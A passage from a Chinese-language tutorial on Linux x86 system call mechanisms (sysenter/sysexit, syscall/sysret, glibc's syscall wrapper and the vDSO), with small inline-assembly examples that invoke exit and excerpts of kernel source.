<p>从有关<code>__kernel_vsyscall</code>的代码中可以看出，在执行<code>sysenter</code>指令之前<code>__kernel_vsyscall</code>会做一些记录工作。</p>
<p>因此，我们需要做的就是手动利用<code>sysenter</code>进入到内核中：</p>
<p>  . 在ELF辅助向量中找到<code>AT_SYSINFO</code>,也就是<code>_ _kernel_vsyscall</code>被写入的地址<br>  . 像传统系统调用一样，将系统调用号和参数写入寄存器中<br>  . 调用<code>_ _kernel_vsyscall</code>函数</p>
<p>你可能从来没写过属于你自己的<code>sysenter</code>封装函数，那是因为内核利用<code>sysenter</code>进入和退出系统调用的规范是会变化的，到那时候你的代码就会崩溃了。</p>
<p>在开始用<code>sysenter</code>触发系统调用前，你都要调用<code>_ _kernel_vsyscall</code>函数。</p>
<p>那么，让我们开始吧。</p>
<h4 id="自己写汇编使用sysenter"><a href="#自己写汇编使用sysenter" class="headerlink" title="自己写汇编使用sysenter"></a>自己写汇编使用sysenter</h4><p>继续利用前面传统系统调用的例子，我们调用<code>exit</code>，退出状态是42.</p>
<p><code>exit</code>的系统调用号是1. 根据前文描述，我们只需要将系统调用号写进<code>eax</code>寄存器中，并把第一个参数(退出状态)写到<code>ebx</code>寄存器中。</p>
<p>（实际上这个例子可以简化一些，但我认为多用一些文字描述会更有趣，让那些之前没见过GCC内联汇编代码的人也可以用下面的例子作为参考）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;elf.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span></span></div><div class="line"><span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[], <span class="keyword">char</span>* envp[])</span></div><div class="line">&#123;</div><div class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> syscall_nr = <span class="number">1</span>;</div><div class="line">  <span class="keyword">int</span> exit_status = <span class="number">42</span>;</div><div class="line">  Elf32_auxv_t *auxv;</div><div class="line"></div><div class="line">  <span class="comment">/* auxilliary vectors are located after the end of the environment</span></div><div class="line">   * variables</div><div class="line">   *</div><div class="line">   * check this helpful diagram: https://static.lwn.net/images/2012/auxvec.png</div><div class="line">   */</div><div class="line">  <span class="keyword">while</span>(*envp++ != <span class="literal">NULL</span>);</div><div class="line"></div><div class="line">  <span class="comment">/* envp is now pointed at the auxilliary vectors, since we've iterated</span></div><div class="line">   * through the environment variables.</div><div class="line">   */</div><div class="line">  <span class="keyword">for</span> (auxv = (Elf32_auxv_t *)envp; auxv-&gt;a_type != AT_NULL; auxv++)</div><div class="line">  &#123;</div><div class="line">    <span class="keyword">if</span>( auxv-&gt;a_type == AT_SYSINFO) &#123;</div><div class="line">      <span class="keyword">break</span>;</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  <span class="comment">/* <span class="doctag">NOTE:</span> in glibc 2.16 and higher you can replace the above code with</span></div><div class="line">   * a call to getauxval(3):  getauxval(AT_SYSINFO)</div><div class="line">   */</div><div class="line"></div><div class="line">  <span class="keyword">asm</span>(</div><div class="line">      <span class="string">"movl %0,  %%eax    \n"</span></div><div class="line">      <span class="string">"movl %1, %%ebx    \n"</span></div><div class="line">      <span class="string">"call *%2          \n"</span></div><div class="line">      : <span class="comment">/* output parameters, we aren't outputting anything, no none */</span></div><div class="line">        <span class="comment">/* (none) */</span></div><div class="line">      : <span class="comment">/* input parameters mapped to %0 and %1, repsectively */</span></div><div class="line">        <span class="string">"m"</span> (syscall_nr), <span class="string">"m"</span> (exit_status), <span class="string">"m"</span> (auxv-&gt;a_un.a_val)</div><div class="line">      : <span class="comment">/* registers that we are "clobbering", unneeded since we are calling exit */</span></div><div class="line">        <span class="string">"eax"</span>, <span class="string">"ebx"</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>接下来，编译，执行，然后检查退出状态:</p>
<pre><code>$ gcc -m32 -o test test.c
$ ./test
$ echo $?
42
</code></pre><p>成功了! 我们利用 <code>sysenter</code>触发了<code>exit</code>系统调用，而不需要引发软件中断。</p>
<h4 id="内核层面：sysenter入口"><a href="#内核层面：sysenter入口" class="headerlink" title="内核层面：sysenter入口"></a>内核层面：<code>sysenter</code>入口</h4><p>目前我们已经知道用户程序如何通过<code>_ _kernel_vsyscall</code>函数利用<code>sysenter</code>触发系统调用，下面来看看内核如何利用系统调用号来执行系统调用中的代码。</p>
<p>回想前面的章节，内核调用<code>ia32_sysenter_target</code>来注册系统调用处理函数。</p>
<p>此函数在<a href="https://github.com/torvalds/linux/blob/v3.13/arch/x86/ia32/ia32entry.S#L162-L163" target="_blank" rel="external"><code>arch/x86/ia32/ia32entry.S</code></a>中以汇编代码实现。我们来看看<code>eax</code>寄存器中的值是在哪里被用来执行系统调用的:</p>
<pre><code>sysenter_dispatch:
    call    *ia32_sys_call_table(,%rax,8)
</code></pre><p>这段代码和前文传统系统调用模式的代码很类似：名为<code>ia32_sys_call_table</code>的表存储着系统调用号。</p>
<p>在所有必要的记录工作完成后，传统系统调用模型以及<code>sysenter</code>系统调用模型采用相同的机制和系统调用表来分配系统调用。</p>
<p>参照 <code>int $0x80</code>（内核层面：int $0x80入口这一章节)，可以了解到<code>ia32_sys_call_table</code> 是如何定义和构造的。</p>
<p>以上内容就是如何通过<code>sysenter</code>系统调用进入内核的全部过程。</p>
<h3 id="sysexit-从sysenter中返回"><a href="#sysexit-从sysenter中返回" class="headerlink" title="sysexit: 从sysenter中返回"></a>sysexit: 从sysenter中返回</h3><p>内核利用<code>sysexit</code>指令将执行环境恢复到用户程序。</p>
<p><code>sysexit</code>指令的使用不像<code>iret</code>那么直接。调用者需要将返回地址写入<code>rdx</code>寄存器中，并将栈指针写入<code>rcx</code>寄存器。</p>
<p>这就意味着你的代码中需要计算执行环境要返回的地址，保存地址值，并在调用<code>sysexit</code>前能恢复。</p>
<p>可以在<a href="https://github.com/torvalds/linux/blob/v3.13/arch/x86/ia32/ia32entry.S#L169-L185" target="_blank" rel="external"><code>arch/x86/ia32/ia32entry.S</code></a> 找到相关代码:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">sysexit_from_sys_call:</div><div class="line">        andl    $~TS_COMPAT,TI_status+THREAD_INFO(%rsp,RIP-ARGOFFSET)</div><div class="line">        <span class="comment">/* clear IF, that popfq doesn't enable interrupts early */</span></div><div class="line">        andl  $~<span class="number">0x200</span>,EFLAGS-R11(%rsp)</div><div class="line">        movl    RIP-R11(%rsp),%edx              <span class="comment">/* User %eip */</span></div><div class="line">        CFI_REGISTER rip,rdx</div><div class="line">        RESTORE_ARGS <span class="number">0</span>,<span class="number">24</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span></div><div class="line">        xorq    %r8,%r8</div><div class="line">        xorq    %r9,%r9</div><div class="line">        xorq    %r10,%r10</div><div class="line">        xorq    %r11,%r11</div><div class="line">        popfq_cfi</div><div class="line">        <span class="comment">/*CFI_RESTORE rflags*/</span></div><div class="line">        popq_cfi %rcx                           <span class="comment">/* User %esp */</span></div><div class="line">        CFI_REGISTER rsp,rcx</div><div class="line">        TRACE_IRQS_ON</div><div class="line">        ENABLE_INTERRUPTS_SYSEXIT32</div></pre></td></tr></table></figure>
<p><code>ENABLE_INTERRUPTS_SYSEXIT32</code>是定义在<a href="https://github.com/torvalds/linux/blob/v3.13/arch/x86/include/asm/irqflags.h#L139-L143" target="_blank" rel="external"><code>arch/x86/include/asm/irqflags.h</code></a>的宏，其中含有<code>sysexit</code>指令。</p>
<p>好了，你已经知道32位快速系统调用是如何工作的了。</p>
<h3 id="64位快速系统调用"><a href="#64位快速系统调用" class="headerlink" title="64位快速系统调用"></a>64位快速系统调用</h3><p>下一步之旅就是去探索64位快速系统调用了。其分别利用<code>syscall</code> 、<code>sysret</code>指令进入系统调用、从系统调用中返回。</p>
<h4 id="syscall-sysret"><a href="#syscall-sysret" class="headerlink" title="syscall/sysret"></a>syscall/sysret</h4><p>Intel指令集参考指南解释了<code>syscall</code>指令是如何工作的:</p>
<pre><code>SYSCALL invokes an OS system-call handler at privilege level 0. It does so by loading RIP from the IA32_LSTAR MSR (after saving the address of the instruction following SYSCALL into RCX).
</code></pre><p>换句话说：为了让内核接收到系统调用，内核必须向<code>IA32_LSTAR</code> MSR注册当系统调用触发时要执行的代码地址。</p>
<p>在<a href="https://github.com/torvalds/linux/blob/v3.13/arch/x86/kernel/cpu/common.c#L1128" target="_blank" rel="external"><code>arch/x86/kernel/cpu/common.c</code></a> 可以找到相关代码:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">syscall_init</span><span class="params">(<span class="keyword">void</span>)</span></span></div><div class="line">&#123;</div><div class="line">        <span class="comment">/* ... other code ... */</span></div><div class="line">        wrmsrl(MSR_LSTAR, system_call);</div></pre></td></tr></table></figure>
<p><code>MSR_LSTAR</code>在<a href="https://github.com/torvalds/linux/blob/v3.13/arch/x86/include/uapi/asm/msr-index.h#L9" target="_blank" rel="external"><code>arch/x86/include/uapi/asm/msr-index.h</code></a>定义为 0xc0000082。</p>
<p>类似传统软件中断型的系统调用, 使用<code>syscall</code>触发系统调用时也定义了一些规范。</p>
<p>用户程序需要将系统调用号写入<code>rax</code>寄存器中。系统调用的参数要c传入通用寄存器中。</p>
<p><a href="http://www.x86-64.org/documentation/abi.pdf" target="_blank" rel="external">x86-64 ABI </a>章节A.2.1 对此有所描述:</p>
<pre><code>1. User-level applications use as integer registers for passing the sequence %rdi, %rsi, %rdx, %rcx, %r8 and %r9. The kernel interface uses %rdi, %rsi, %rdx, %r10, %r8 and %r9.
2. A system-call is done via the syscall instruction. The kernel destroys registers %rcx and %r11.
3. The number of the syscall has to be passed in register %rax.
4. System-calls are limited to six arguments,no argument is passed directly on the stack.
5. Returning from the syscall, register %rax contains the result of the system-call. A value in the range between -4095 and -1 indicates an error, it is -errno.
6. Only values of class INTEGER or class MEMORY are passed to the kernel.
</code></pre><p><a href="https://github.com/torvalds/linux/blob/v3.13/arch/x86/kernel/entry_64.S#L569-L591" target="_blank" rel="external"><code>arch/x86/kernel/entry_64.S</code></a>的注释中也有相关介绍。</p>
<p>现在我们已经知道了如何执行系统调用以及如何传递这些参数，开始着手写一些内联汇编代码。</p>
<h3 id="自己写汇编使用syscall"><a href="#自己写汇编使用syscall" class="headerlink" title="自己写汇编使用syscall"></a>自己写汇编使用syscall</h3><p>基于前面介绍的例子，我们开始着手编写一小段含有内联汇编的C程序，代码中执行<code>exit</code>系统调用并传递退出状态：42.</p>
<p>首先，我们要找到<code>exit</code>的系统调用号。在这个例子中，我们需要从<a href="https://github.com/torvalds/linux/blob/v3.13/arch/x86/syscalls/syscall_64.tbl#L69" target="_blank" rel="external"><code>arch/x86/syscalls/syscall_64.tbl</code></a>中读取这张表：</p>
<pre><code>60 common exit sys_exit
</code></pre><p><code>exit</code>的系统调用号是60. 根据前文介绍，我们只需将60写入<code>eax</code>寄存器，以及第一个参数(退出状态)写入<code>rdi</code>寄存器。</p>
<p>请看下面这段含有内联汇编的C代码。类似前面的例子，从清晰度来看，冗余的文字可能比代码本身更重要。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span></span></div><div class="line"><span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></div><div class="line">&#123;</div><div class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> syscall_nr = <span class="number">60</span>;</div><div class="line">  <span class="keyword">long</span> exit_status = <span class="number">42</span>;</div><div class="line"></div><div class="line">  <span class="keyword">asm</span> (<span class="string">"movq %0, %%rax\n"</span></div><div class="line">       <span class="string">"movq %1, %%rdi\n"</span></div><div class="line">       <span class="string">"syscall"</span></div><div class="line">    : <span class="comment">/* output parameters, we aren't outputting anything, no none */</span></div><div class="line">      <span class="comment">/* (none) */</span></div><div class="line">    : <span class="comment">/* input parameters mapped to %0 and %1, repsectively */</span></div><div class="line">      <span class="string">"m"</span> (syscall_nr), <span class="string">"m"</span> (exit_status)</div><div class="line">    : <span class="comment">/* registers that we are "clobbering", unneeded since we are calling exit */</span></div><div class="line">      <span class="string">"rax"</span>, <span class="string">"rdi"</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>接下来，编译，执行，然后检查退出状态:</p>
<pre><code>$ gcc -o test test.c
$ ./test
$ echo $?
42
</code></pre><p>成功了! 我们利用<code>syscall</code>系统调用方式来触发<code>exit</code>系统调用。避免了软件中断，如果我们要用micro-benchmark 来计算时间的话，这种方法执行起来要快许多。</p>
<h3 id="内核层面：syscall入口"><a href="#内核层面：syscall入口" class="headerlink" title="内核层面：syscall入口"></a>内核层面：syscall入口</h3><p>现在我们已经知道了如何从用户程序中触发系统调用。接下来就要介绍内核如何利用系统调用号执行系统调用中的代码。</p>
<p>回想前文，我们知道如何将<code>system_call</code>函数的地址写入<code>LSTAR</code> MSR中。</p>
<p>下面就来看看这个函数中的代码是如何利用<code>rax</code>寄存器将执行环境切换到系统调用中的。可以参考<a href="https://github.com/torvalds/linux/blob/v3.13/arch/x86/kernel/entry_64.S#L629" target="_blank" rel="external"><code>arch/x86/kernel/entry_64.S</code></a>:</p>
<pre><code>call *sys_call_table(,%rax,8)  # XXX:    rip relative
</code></pre><p>类似传统系统调用，<code>sys_call_table</code>一张在C文件中定义的表，其利用<code>#include</code>将脚本产生的C代码包含进来。</p>
<p>在<a href="https://github.com/torvalds/linux/blob/v3.13/arch/x86/kernel/syscall_64.c#L25-L32" target="_blank" rel="external"><code>arch/x86/kernel/syscall_64.c</code></a>,注意底部的<code>#include</code>:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">asmlinkage <span class="keyword">const</span> <span class="keyword">sys_call_ptr_t</span> sys_call_table[__NR_syscall_max+<span class="number">1</span>] = &#123;</div><div class="line">        <span class="comment">/*</span></div><div class="line">         * Smells like a compiler bug -- it doesn't work</div><div class="line">         * when the &amp; below is removed.</div><div class="line">         */</div><div class="line">        [<span class="number">0</span> ... __NR_syscall_max] = &amp;sys_ni_syscall,</div><div class="line">#include &lt;<span class="keyword">asm</span>/syscalls_64.h&gt;</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>从前文我们知道，系统调用表定义在<a href="https://github.com/torvalds/linux/blob/v3.13/arch/x86/syscalls/syscall_64.tbl" target="_blank" rel="external"><code>arch/x86/syscalls/syscall_64.tbl</code></a>。与传统中断模式一样，脚本在内核编译的时候执行并通过<code>syscall_64.tbl</code>文件中的表生成<code>syscalls_64.h</code>文件。</p>
<p>上述代码包括能生成系统调用号索引的函数指针数组的C代码。</p>
<p>以上就是如何通过<code>syscall</code>系统调用进入内核的全过程。</p>
<h3 id="sysret-从syscall中返回"><a href="#sysret-从syscall中返回" class="headerlink" title="sysret: 从syscall中返回"></a>sysret: 从syscall中返回</h3><p>内核利用<code>sysret</code>指令将执行环境恢复到用户程序执行<code>syscall</code>的地方。</p>
<p><code>sysret</code>比起<code>sysexit</code>来要简单一些，因为当执行<code>syscall</code>时，需要被恢复执行的地址保存在<code>rcx</code>寄存器中。</p>
<p>只要能将这个地址保存起来，并在执行<code>sysret</code>前将其恢复到<code>rcx</code>寄存器中，执行环境就能在触发<code>syscall</code>的地方恢复。</p>
<p>这种机制比较方便，因为<code>sysenter</code>却要求你自己在代码中计算这个地址，并将其重写到寄存器中。</p>
<p>上述代码在<a href="https://github.com/torvalds/linux/blob/v3.13/arch/x86/kernel/entry_64.S#L650-L655" target="_blank" rel="external"><code>arch/x86/kernel/entry_64.S</code></a>:</p>
<pre><code>movq RIP-ARGOFFSET(%rsp),%rcx
CFI_REGISTER    rip,rcx
RESTORE_ARGS 1,-ARG_SKIP,0
/*CFI_REGISTER  rflags,r11*/
movq    PER_CPU_VAR(old_rsp), %rsp
USERGS_SYSRET64
</code></pre><p>其中<code>USERGS_SYSRET64</code>是定义在<a href="https://github.com/torvalds/linux/blob/v3.13/arch/x86/include/asm/irqflags.h#L133-L135" target="_blank" rel="external"><code>arch/x86/include/asm/irqflags.h</code></a>中的宏，其中包含<code>sysret</code>指令。</p>
<p>好了，目前为止，你已经知道64位系统调用是如何工作的了。</p>
<h2 id="syscall-2-半手动调用syscall"><a href="#syscall-2-半手动调用syscall" class="headerlink" title="syscall(2)半手动调用syscall"></a>syscall(2)半手动调用syscall</h2><p>太棒了，针对不同系统调用模型，我们已经知道如何编写汇编代码去触发这些系统调用了。</p>
<p>通常来说，你没必要自己写汇编代码。glibc提供的封装器函数已经为你处理好了所有的汇编代码。</p>
<p>当然，也有一些系统调用，glibc并没有为其做好封装器。其中一个例子就是<code>futex</code>–快速用户层上锁系统调用。</p>
<p>等等，为什么<a href="http://man7.org/linux/man-pages/man7/futex.7.html#NOTES" target="_blank" rel="external"><code>futex</code></a>没有系统调用封装器呢？</p>
<p><code>futex</code>是为库函数调用准备的，而不是应用程序。因此，要想调用<code>futex</code>，你必须这样做:</p>
<ol>
<li>为你想支持的平台生成汇编存根(stub)</li>
<li>使用glibc提供的<code>syscall</code>封装器</li>
</ol>
<p>有些时候，如果你想执行那些没有封装器的系统调用，你别无选择，只能利用第二种方法：使用glibc提供的<code>syscall</code>函数。</p>
<p>我们试试利用glibc提供的<code>syscall</code>调用<code>exit</code>，其退出状态是42:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span></span></div><div class="line"><span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></div><div class="line">&#123;</div><div class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> syscall_nr = <span class="number">60</span>;</div><div class="line">  <span class="keyword">long</span> exit_status = <span class="number">42</span>;</div><div class="line"></div><div class="line">  syscall(syscall_nr, exit_status);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>接下来，编译，执行，然后检查退出状态:</p>
<pre><code>$ gcc -o test test.c
$ ./test
$ echo $?
42
</code></pre><p>成功了！我们利用glibc提供的<code>syscall</code>封装器成功的调用了<code>exit</code>.</p>
<h2 id="glibc-syscall封装器内幕"><a href="#glibc-syscall封装器内幕" class="headerlink" title="glibc syscall封装器内幕"></a>glibc syscall封装器内幕</h2><p>来看看前面例子中<code>syscall</code>封装器在glibc中是如何工作的</p>
<p>在<a href="https://github.molgen.mpg.de/git-mirror/glibc/blob/glibc-2.15/sysdeps/unix/sysv/linux/x86_64/syscall.S#L24-L42" target="_blank" rel="external"><code>sysdeps/unix/sysv/linux/x86_64/syscall.S</code></a>：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">/* Usage: long syscall (syscall_number, arg1, arg2, arg3, arg4, arg5, arg6)</div><div class="line">   We need to do some arg shifting, the syscall_number will be in</div><div class="line">   rax.  */</div><div class="line"></div><div class="line"></div><div class="line">        .text</div><div class="line">ENTRY (syscall)</div><div class="line">        movq %rdi, %rax         /* Syscall number -&gt; rax.  */</div><div class="line">        movq %rsi, %rdi         /* shift arg1 - arg5.  */</div><div class="line">        movq %rdx, %rsi</div><div class="line">        movq %rcx, %rdx</div><div class="line">        movq %r8, %r10</div><div class="line">        movq %r9, %r8</div><div class="line">        movq 8(%rsp),%r9        /* arg6 is on the stack.  */</div><div class="line">        syscall                 /* Do the system call.  */</div><div class="line">        cmpq $-4095, %rax       /* Check %rax for error.  */</div><div class="line">        jae SYSCALL_ERROR_LABEL /* Jump to error handler if error.  */</div><div class="line">L(pseudo_end):</div><div class="line">        ret                     /* Return to caller.  */</div></pre></td></tr></table></figure>
<p>前面我们给出了x86_64 ABI文档的参考链接，其描述了用户层和内核层的调用规范。</p>
<p>这段汇编stud很酷，因为它同时遵守两种调用规范。传递到这个函数的参数遵守用户层调用规范，但是在转移到另一组不同的寄存器利用<code>syscall</code>进入内核之前，又遵守内核层规范。</p>
<p>以上就是在你要执行默认没有封装器的系统调用时，glibc提供的<code>syscall</code>封装器的工作方式。</p>
<h2 id="虚拟系统调用"><a href="#虚拟系统调用" class="headerlink" title="虚拟系统调用"></a>虚拟系统调用</h2><p>到目前为止，我们已经介绍了所有进入内核触发系统调用的方法，并演示了如何手动(或者半手动）触发系统调用将系统从用户层切换到内核层。</p>
<p>倘若程序能触发一些系统调用，而不需要进入到内核呢？</p>
<p>这就是Linux vDSO存在的原因。Linux vDSO是内核代码的一部分，但是却被映射到用户程序地址空间中在用户层执行。</p>
<p>这也就是一些系统调用不用进入到内核就能被执行的原因。举个这样的例子: <code>gettimeofday</code>系统调用。</p>
<p>程序调用<code>gettimeofday</code>并不会真正进入到内核。而是简单的调用了内核提供的一小段代码，然后在用户层执行。</p>
<p>没有软件中断，也不需要复杂的<code>sysenter</code>或者<code>syscall</code>的记录工作。<code>gettimeofday</code>只是一个普通的函数调用。</p>
<p>当你执行<code>ldd</code>命令时，可以看到vDSO出现在第一个条目中：</p>
<pre><code>$ ldd `which bash`
 linux-vdso.so.1 =&gt;  (0x00007fff667ff000)
 libtinfo.so.5 =&gt; /lib/x86_64-linux-gnu/libtinfo.so.5 (0x00007f623df7d000)
  libdl.so.2 =&gt; /lib/x86_64-linux-gnu/libdl.so.2 (0x00007f623dd79000)
  libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f623d9ba000)
  /lib64/ld-linux-x86-64.so.2 (0x00007f623e1ae000)
</code></pre><p>下面来看看vDSO在内核中是如何设置的。</p>
<h2 id="内核中的vDSO"><a href="#内核中的vDSO" class="headerlink" title="内核中的vDSO"></a>内核中的vDSO</h2><p>可以在 <a href="https://github.com/torvalds/linux/tree/v3.13/arch/x86/vdso" target="_blank" rel="external"><code>arch/x86/vdso/</code></a>中找到vDSO的源码。 其中包括一小段汇编代码、一些C源文件和一个链接器脚本</p>
<p>此<a href="https://sourceware.org/binutils/docs/ld/Scripts.html" target="_blank" rel="external">链接器脚本</a>是个很酷的东西，可以具体去了解一下。</p>
<p>看看<a href="https://github.com/torvalds/linux/blob/v3.13/arch/x86/vdso/vdso.lds.S" target="_blank" rel="external"><code>arch/x86/vdso/vdso.lds.S</code></a>:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="comment">/*</span></div><div class="line"> * This controls what userland symbols we export from the vDSO.</div><div class="line"> */</div><div class="line">VERSION &#123;</div><div class="line">        LINUX_2<span class="number">.6</span> &#123;</div><div class="line">        global:</div><div class="line">                clock_gettime;</div><div class="line">                __vdso_clock_gettime;</div><div class="line">                gettimeofday;</div><div class="line">                __vdso_gettimeofday;</div><div class="line">                getcpu;</div><div class="line">                __vdso_getcpu;</div><div class="line">                time;</div><div class="line">                __vdso_time;</div><div class="line">        local: *;</div><div class="line">        &#125;;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>链接器脚本很有用处，但并不被大家所熟知。链接器脚本会处理vDSO要导出的符号表。</p>
<p>可以看到，vDSO导出了4个不同的函数，每个函数都有两个名字。<br>可以在此文件夹下的C文件中找到函数的定义。</p>
<p>例如，<code>gettimeofday</code>的源代码可以在<a href="https://github.com/torvalds/linux/blob/v3.13/arch/x86/vdso/vclock_gettime.c#L281-L282" target="_blank" rel="external"><code>arch/x86/vdso/vclock_gettime.c</code></a>中找到:</p>
<pre><code>int gettimeofday(struct timeval *, struct timezone *)
    __attribute__((weak, alias(&quot;__vdso_gettimeofday&quot;)));
</code></pre><p>这段代码将<code>gettimeofday</code>作为<code>__vdso_gettimeofday</code> 的弱别名(<a href="https://gcc.gnu.org/onlinedocs/gcc-4.3.5/gcc/Function-Attributes.html" target="_blank" rel="external">weak alias</a>)。</p>
<p><a href="https://github.com/torvalds/linux/blob/v3.13/arch/x86/vdso/vclock_gettime.c#L260-L280" target="_blank" rel="external">同文件</a>中的<code>__vdso_gettimeofday</code>函数中包含了当用户程序执行<code>gettimeofday</code>系统调用时真正在用户层执行的源代码。</p>
<h2 id="在内存中定为vDSO"><a href="#在内存中定为vDSO" class="headerlink" title="在内存中定为vDSO"></a>在内存中定为vDSO</h2><p>由于地址空间布局随机化(<a href="https://en.wikipedia.org/wiki/Address_space_layout_randomization" target="_blank" rel="external">ASLR</a>)的原因,当程序开始执行时，vDSO会被加载到随机的地址空间中。</p>
<p>如果vDSO加载到随机地址空间中，用户程序是如何找到它的呢？</p>
<p>回想前文提到的<code>sysenter</code>系统调用方法，用户程序要调用<code>_ _kernel_vsyscall</code>函数，而不是自己写<code>sysenter</code>汇编代码。</p>
<p>而<code>_ _kernel_vsyscall</code>函数也是vDSO的一部分。</p>
<p>提供的代码样例中通过搜索<a href="https://www.gnu.org/software/libc/manual/html_node/Auxiliary-Vector.html" target="_blank" rel="external">ELF辅助头文件</a>找到和<code>AT_SYSINFO</code>匹配的头文件，头文件中含有<code>_ _kernel_vsyscall</code>函数的地址。</p>
<p>类似的，要定位到vDSO, 用户程序可以搜索ELF辅助头文件找到和<code>AT_SYSINFO_EHDR</code>匹配的头文件. 里面包含由链接器脚本生成的vDSO的ELF头的起始地址。</p>
<p>两个例子中，程序被加载时内核都会将其地址写入到ELF头中。这也就是为何正确的地址总是出现<code>AT_SYSINFO_EHDR</code>和<code>AT_SYSINFO</code>中。</p>
<p>一旦定为到ELF头部信息，用户程序就能解析ELF对象了(可以用<a href="http://www.mr511.de/software/english.html" target="_blank" rel="external">libelf</a>),并且可以根据需要调用ELF对象中的函数。</p>
<p>这样很酷，因为这就意味着vDSO能充分利用ELF有用的特性，比如<a href="https://www.akkadia.org/drepper/symbol-versioning" target="_blank" rel="external"> symbol versioning</a>。</p>
<p>内核文档 <a href="https://github.com/torvalds/linux/tree/v3.13/Documentation/vDSO" target="_blank" rel="external"><code>Documentation/vDSO/</code></a>中有解析vDSO和调用其中函数的例子。</p>
<h2 id="glibc中的vDSO"><a href="#glibc中的vDSO" class="headerlink" title="glibc中的vDSO"></a>glibc中的vDSO</h2><p>大多数情况下，大家都会访问vDSO，但并不会意识到。那是因为glibc利用前面章节介绍的接口对其进行了封装抽象。</p>
<p>当一个程序被加载时，<a href="http://man7.org/linux/man-pages/man8/ld.so.8.html" target="_blank" rel="external">动态链接器和加载器</a>便会加载程序依赖的DSOs，也包括vDSO.</p>
<p>当glibc解析被加载程序的ELF头部时，会存储有关于vDSO的一些位置信息。也包括简短的stub函数，用来在真正执行系统调用前搜索vDSO中的符号名。</p>
